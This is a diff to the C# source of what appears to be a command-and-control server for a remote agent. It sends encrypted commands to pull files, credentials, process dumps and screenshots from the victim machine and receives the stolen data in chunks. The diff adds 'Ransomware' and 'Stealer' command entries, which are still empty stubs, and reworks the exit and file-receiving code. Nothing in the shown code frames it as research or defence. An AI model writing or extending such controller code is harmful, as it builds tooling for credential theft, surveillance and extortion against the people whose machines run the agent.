@@ -39,17 +39,19 @@ namespace Server_side
             agentLogBox.TextChanged += agentLogBox_TextChanged;
 
             cmdComboBox.Items.Clear();
-            cmdComboBox.Items.Add("Built-in Commands");
             cmdComboBox.Items.Add("Get File");
             cmdComboBox.Items.Add("Get Credential");
             cmdComboBox.Items.Add("Get Process Dump");
             cmdComboBox.Items.Add("Get Screenshot");
+            cmdComboBox.Items.Add("Ransomware");
+            cmdComboBox.Items.Add("Stealer");
             cmdComboBox.Items.Add("Exit");
             cmdComboBox.SelectedIndex = 0;
 
             encryptor = new(passPhrase.Trim());
         }
 
+        // Keeping agent log in the settings
         private void InitializeSavedValues(string clientIP)
         {
             string uid = $"{clientIP}_{passPhrase}";
@@ -108,33 +110,30 @@ namespace Server_side
             agentLogBox.AppendText(log + Environment.NewLine);
         }
 
-        private void cmdComboBox_SelectedIndexChanged(object sender, EventArgs e)
+        private void sendCommandBtn1_Click(object sender, EventArgs e)
         {
             string delimiter = "|;|";
             string placeholder = "";
             switch (cmdComboBox.SelectedIndex)
             {
                 case 0:
-                    commandBox.Text = "";
-                    return;
-                case 1:
                     {
                         placeholder = agentfileBox.Text;
                         break;
                     }
-                case 2:
-                    { 
+                case 1:
+                    {
                         placeholder = "getcredential";
-                        
+
                         break;
                     }
-                case 3:
+                case 2:
                     placeholder = "getprocessdump";
                     break;
-                case 4:
+                case 3:
                     {
                         placeholder = "getscreenshot";
-                        string command = $"{cmdComboBox.SelectedIndex + 1}{delimiter}{placeholder}";
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                         byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                         NetworkLayer.Send(clientSocket, encryptedCommand);
 
@@ -144,6 +143,7 @@ namespace Server_side
                         try
                         {
                             byte[] image = GetResultFile(false);
+                            MessageBox.Show("Screenshot received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             if (image != null && image.Length > 0)
                             {
                                 using (MemoryStream ms = new MemoryStream(image))
@@ -155,7 +155,7 @@ namespace Server_side
                             }
                             else
                             {
-                                logging("Received image data is null or empty.");
+                                logging("Error when receiving the screenshot.");
                             }
                         }
                         catch (Exception ex)
@@ -165,15 +165,36 @@ namespace Server_side
                         }
                         break;
                     }
+                case 4:
+                    {
+                        break;
+                    }
                 case 5:
-                    placeholder = "exit";
-                    break;
-            }
+                    {
+                        break;
+                    }
+                case 6:
+                    {
+                        placeholder = "exit";
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
 
-            // sth here
+                        logging("Command sent: " + cmdComboBox.Text);
+
+                        // Receive response
+                        byte[] response = NetworkLayer.ReceiveResult(clientSocket);
+                        string decryptedResponse = encryptor.Decrypt(response);
+                        logging("Response received: " + decryptedResponse);
+
+                        MessageBox.Show("Client will be disconnected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        this.Close();
+                        break;
+                    }
+            }
         }
 
-        private byte[] GetResultFile(bool saved)
+        private byte[]? GetResultFile(bool saved)
         {
             string delimiter = "|;|";
             byte[] received = NetworkLayer.ReceiveResult(clientSocket);
@@ -190,15 +211,21 @@ namespace Server_side
                 byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
                 string chunkDecrypted = encryptor.Decrypt(chunk);
                 string[] chunkParts = chunkDecrypted.Split(delimiter);
+                string chunkGuid = chunkParts[0];
+                if (chunkGuid != guid)
+                {
+                    MessageBox.Show("Error in GetResultFile: GUID mismatch");
+                    return null;
+                }
                 string chunkData = chunkParts[1];
                 fileBase64 += chunkData;
             }
 
             byte[] fileData = Encryptor.InvertStr(fileBase64);
-            
+
             if (saved)
             {
-                string filePath = Path.Combine(Program.mySettings.Properties["SavePath"].DefaultValue.ToString(), fileName);
+                string filePath = Path.Combine("", fileName);
                 File.WriteAllBytes(filePath, fileData);
             }
 
